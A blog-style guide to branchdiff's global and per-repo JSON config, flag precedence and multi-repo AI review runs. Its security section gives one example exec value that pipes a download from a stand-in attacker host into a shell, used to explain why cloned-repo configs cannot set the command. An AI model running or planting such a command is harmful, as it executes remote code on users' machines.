# Configure Once, Review Everywhere - branchdiff's Config System and Multi-Repo auto

You maintain six repos. Every morning you open a terminal, `cd` into the first one, and type the same line you've typed a hundred times: `branchdiff auto --tool claude --skill --resolve --approve 2 --push --notify --worktree`. Then you `cd` into the second repo and type it again. By the fourth repo you've mistyped `--approve` as `--aprove` once, silently skipped `--push` on another, and you're no longer sure which repo actually got the strict review policy you meant to apply everywhere.

This is the same problem `.eslintrc` solved for linting fifteen years ago: a policy that lives in a file instead of in your fingers. Nobody re-types their lint rules into the CLI on every run — they write them once, commit them, and every invocation of `eslint` picks them up automatically. `auto`'s new config file does the same thing for how AI reviews your PRs. And once the policy is a file instead of a memorized flag string, there's no reason to run it one repo at a time — you can point a single `auto` invocation at every repo you maintain and let it work through all of them in one pass.

There's a catch worth taking seriously before you reach for it: a config file that any cloned repo can carry is also a config file that could, in principle, tell branchdiff to run a shell command on your machine. The design closes that door deliberately, and it's worth understanding exactly how — because "configure once" only works if you trust it not to be hijacked by the ninth repo you clone.

---

## Two files, one merged config

branchdiff reads defaults from up to two JSON files:

- **`~/.branchdiff/config.json`** — global, applies to every repo on the machine.
- **`.branchdiff.json`** — local, dropped in a repo's root (or wherever you launch `auto` from).

Each file has the same two top-level keys. `defaults` mirrors the root command's flags — the ones that control how a single diff view opens:

```json
{
  "defaults": {
    "mode": "unified",
    "port": 5391,
    "dark": true
  }
}
```

`auto` mirrors every flag `auto` itself accepts:

```json
{
  "auto": {
    "tool": "claude",
    "skill": true,
    "resolve": true,
    "approve": 2,
    "push": true,
    "notify": true,
    "worktree": true,
    "maxFiles": 200,
    "maxLines": 4000,
    "skipAuthor": true
  }
}
```

Drop the global file at `~/.branchdiff/config.json` and every repo on the machine inherits that policy — strictness level, which AI tool to drive, whether to push automatically — without a single flag on the command line. Now `branchdiff auto` alone does what the six-flag version used to do.

---

## Precedence: what wins when files disagree

The rule is short: **a flag you actually type always wins. After that, the more local file wins over the more global one.**

For a single-repo run that's just two layers — CLI flag beats `.branchdiff.json` beats `~/.branchdiff/config.json`. For a multi-repo `auto` run there's a third layer in between: the launch directory's own `.branchdiff.json` (if you're running `auto` from a parent folder that isn't itself a repo) sits between global and each individual repo's file.

```
CLI flag  >  repo's own .branchdiff.json  >  launch-dir .branchdiff.json  >  ~/.branchdiff/config.json
```

Concrete example: global config sets `"approve": 1` (block only `[must-fix]`). Your `payments-api` repo is stricter — its own `.branchdiff.json` sets `"approve": 3`. Every other repo you maintain gets level 1, `payments-api` gets level 3, and if you ever run `auto --approve 5` by hand for a one-off audit, that beats both — for that invocation only.

**One important exception to "per-repo config":** a handful of `auto` keys describe the *launch itself*, not any one repo's review — `repoPaths`, `repoConcurrency`, `keepServers`, `watch`, `forceSession`, and also `detach`/`yes`. These resolve **once**, before any repo is scanned, from CLI flag → launch-dir file → global file. A repo's own `.branchdiff.json` can't change how many repos run concurrently or whether the whole pass runs detached — those decisions are made before that repo's file is even read.

---

## The one deliberate exception: exec and tool are never trusted from a cloned repo

Here's the callout that matters most if you're going to lean on this system across repos you didn't write yourself.

`auto.exec` and `auto.tool` — the settings that decide *what actually runs the review* — are honored only from the **global** config or a CLI flag. Never from a `.branchdiff.json`.

The reason: `.branchdiff.json` can arrive in your working copy via `git clone`. If a `.branchdiff.json` in someone else's repo could set `exec`, that repo could ship `"exec": "curl attacker.example | sh"` and have it run on your machine the moment you pointed `auto` at it. Config files that travel with the repo do not get to choose the command that executes on your behalf — only config you control (global) or type yourself (CLI) does.

`yes` gets the same treatment for a parallel reason. It pre-answers the "review these discovered repos unattended?" prompt — and that prompt exists specifically to stop a repo from silently including itself in an unattended run. If a repo's own `.branchdiff.json` could set `yes`, a discovered repo could self-approve its own inclusion. So `yes` is launch-dir/global only, same as `exec`/`tool`.

Everything else in `auto` — `resolve`, `approve`, `maxFiles`, `notify`, `worktree`, and the rest — is fair game per repo, because none of it can execute arbitrary code or bypass a consent gate. A `.branchdiff.json` can make its own repo's reviews stricter or looser. It cannot make branchdiff run something it wasn't told to run globally, and it cannot vouch for its own repo being safe to scan.

---

## Seeing what's actually in effect

Two commands exist so you never have to guess which file won.

```bash
branchdiff config
```

prints the fully merged, effective config — every key, its resolved value, and which file it came from. A key nobody ever set doesn't show as "unset" — it shows branchdiff's real built-in default, so `branchdiff config` is a complete picture of how the next `auto` run will actually behave, not just a diff of what you changed.

```bash
branchdiff config sample
branchdiff config sample --global
```

scaffolds a starter file — a handful of commonly-useful keys, not every possible flag — at `.branchdiff.json` or, with `--global`, at `~/.branchdiff/config.json`. It refuses to overwrite a file that already exists unless you pass `--force`, so running it a second time by habit doesn't clobber a config you've since hand-edited.

Two failure modes, handled differently on purpose:

| Problem | Behavior |
| --- | --- |
| Malformed JSON in a config file | Fails clearly, naming the exact file that's broken |
| Unrecognized key in a config file | Warns (names the key and the file), does not fail |
| Bad per-repo config, single-repo run | That run fails |
| Bad per-repo config, multi-repo `auto` run | Only that one repo is skipped; the rest of the pass proceeds |
| Bad global or launch-dir config, multi-repo `auto` run | Stops the whole run before it starts |

That last row is the one to remember: a typo in one repo's `.branchdiff.json` costs you one repo for that cycle, not the whole morning's review pass.

---

## Multi-repo auto: the payoff

This is where "configure once" earns its keep. Run `auto` from a directory that isn't itself a git repo — say, the parent folder that holds all your work — and it reviews every git repo directly beneath it:

```bash
cd ~/work
branchdiff auto --review
```

Or name repos explicitly, comma-separated, repeatable, mixing absolute, relative, and `~`-prefixed paths:

```bash
branchdiff auto --repo-paths ~/work/api,../web,~/work/internal-tools --review
```

Repos are scanned together, capped by `--repo-concurrency` (default 4 at a time — don't open forty session servers on the first run). Their open PRs come back as one combined, per-repo-grouped list, and you pick once — comma-separated numbers, a range like `1-5`, `a` for all, `q` to quit — instead of picking separately for every repo. After that, reviews run repo by repo, and every other `auto` flag (and, as of this config system, every config-file default) applies per repo exactly as it would in a single-repo run.

Because a parent directory can quietly contain repos you weren't thinking about, `auto` asks once before reviewing discovered repos unattended — naming them explicitly with `--repo-paths` skips that prompt, since you've already told it exactly what you meant to include.

A few flags exist specifically for the multi-repo case:

- **`--keep-servers <n|all>`** — caps how many session servers a cycle leaves running, either per repo or `all` across the whole pass, retiring the oldest only once every review in that cycle has finished.
- **`--watch`** — keeps `auto` running across cycles; a repo newly cloned into the parent directory is picked up and joins the next cycle automatically.

Every pass that reviewed something ends with a report, grouped by repo:

```
payments-api    (~/work/payments-api)
  PR #142  outcome: reviewed, 3 comments   github.com/org/payments-api/pull/142
           session: http://localhost:5391  (running)
  PR #139  outcome: skipped (max-files)    github.com/org/payments-api/pull/139

internal-tools  (~/work/internal-tools)
  PR #8    outcome: reviewed, 0 comments   github.com/org/internal-tools/pull/8
           session: http://localhost:5392  (stopped)
```

And the exit code tells a script what happened without parsing that report: `0` for a clean pass, `1` when nothing was attempted, `2` when something was skipped or failed. That's what makes "review every repo I maintain" safe to put behind a cron job instead of something you babysit.

---

## Where to stay skeptical

**Config is a default, not a guarantee.** A CLI flag always overrides it — which is correct, but it also means a config file can lull you into assuming a policy is in force when someone (including past-you) typed a one-off flag that quietly won for that run.

**`--repo-concurrency` and `--keep-servers` trade speed for local resource use.** Scanning ten repos at concurrency 4 is faster than one at a time, but it's also ten repos' worth of git operations and session servers competing for the same machine. Start conservative on a laptop.

**The unattended-discovery prompt is a speed bump, not a security boundary.** It stops you from accidentally reviewing a repo you forgot was in that folder. It does not vet the repo's contents — a malicious `.branchdiff.json` still can't run `exec`, but the repo's actual code is whatever it is, same as any clone.

**A skipped repo in a multi-repo report is easy to miss if you don't read the report.** Exit code `2` tells a script something went wrong; it doesn't tell you *what* without reading the printed grouping. Pipe the report somewhere you'll actually see it if you're running this unattended.

**`branchdiff config` shows resolved values, not intent.** If a key's built-in default happens to match what you meant to set, you can't tell from the output alone whether your file actually took effect or whether you're looking at the default by coincidence. When in doubt, change the value to something distinctive and re-run `config` to confirm it moved.

---

## Quick start

Full install guide, changelog, and uninstall steps on the [branchdiff releases page](https://encryptioner.github.io/branchdiff-releases/).

```bash
npm install -g @encryptioner/branchdiff
# or: pip install branchdiff
# or: brew tap encryptioner/branchdiff https://github.com/encryptioner/branchdiff-releases \
#          && brew install branchdiff

branchdiff config sample --global        # scaffold ~/.branchdiff/config.json
# edit it: set your default tool, approve level, notify, etc.
branchdiff config                        # confirm what's actually in effect

cd ~/work
branchdiff auto --review                 # reviews every repo directly under here
# or: branchdiff auto --repo-paths ~/work/api,~/work/web --review
```

Once the policy lives in a file, "review my open PRs" stops being a command you remember and becomes a command you alias — or schedule — because it behaves identically, and safely, across every repo you maintain.

---

## Let's Connect

I am always excited to hear what you are building. If this guide helped, or if you have questions about building self-review habits into your workflow:

- **Website**: [encryptioner.github.io](https://encryptioner.github.io)
- **LinkedIn**: [Mir Mursalin Ankur](https://www.linkedin.com/in/mir-mursalin-ankur)
- **GitHub**: [@Encryptioner](https://github.com/Encryptioner)
- **X (Twitter)**: [@AnkurMursalin](https://twitter.com/AnkurMursalin)
- **Technical Writing**: [Nerddevs](https://nerddevs.com/author/ankur/)
- **Support**: [SupportKori](https://www.supportkori.com/mirmursalinankur)

*branchdiff releases, install guide, and changelog: [encryptioner.github.io/branchdiff-releases](https://encryptioner.github.io/branchdiff-releases/)*
